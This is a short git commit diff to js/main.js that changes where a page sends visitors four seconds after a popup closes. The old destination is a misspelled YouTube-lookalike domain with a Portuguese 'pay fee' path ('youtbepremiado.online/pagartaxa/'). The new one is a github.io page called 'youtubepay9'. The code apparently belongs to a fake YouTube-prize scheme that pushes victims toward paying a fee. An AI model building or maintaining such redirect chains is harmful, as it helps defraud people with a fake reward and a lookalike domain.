3367b77c4c91616d3c84e1124b70280f2b4d3a6d
abreaqui <jp.gomes20002@outlook.com>
2024-08-27 22:11:35 -0300

    Update main.js

--- js/main.js
+++ js/main.js
@@ -46,7 +46,7 @@ const intervalo = setInterval(() => {
         // Oculta o popup após 4 segundos
         setTimeout(function() {
             popup.classList.add("hidden");
-            window.location.href = "https://youtbepremiado.online/pagartaxa/";
+            window.location.href = "https://abreaqui.github.io/youtubepay9";
         }, 4000);
     });
 });
